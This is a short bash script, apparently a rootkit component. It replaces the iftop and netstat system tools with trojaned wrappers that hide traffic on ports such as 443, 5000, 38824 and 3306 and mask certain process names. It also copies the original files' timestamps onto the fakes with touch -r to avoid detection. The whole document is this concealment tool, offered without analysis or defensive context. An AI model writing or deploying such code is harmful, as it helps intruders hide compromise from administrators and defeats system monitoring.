#!/bin/bash
cd /sbin/
mv iftop iftop2
echo '#!/bin/bash
iftop2 -f "port not 443 and port not 5353 and port not 5000 and port not 38824 and port not 3306"' > iftop
chmod +x iftop
touch -r iftop2 iftop
#netstat
mv /bin/netstat /bin/ntstat
cd /bin/
echo '#!/bin/bash
/bin/ntstat $1 $2 $3 $4 $5 $6 | grep -Ev "443|5000|5353|38824|dhclient|kworker|TIME_WAIT"' > netstat
chmod 755 netstat
touch -r /bin/ntstat /bin/netstat
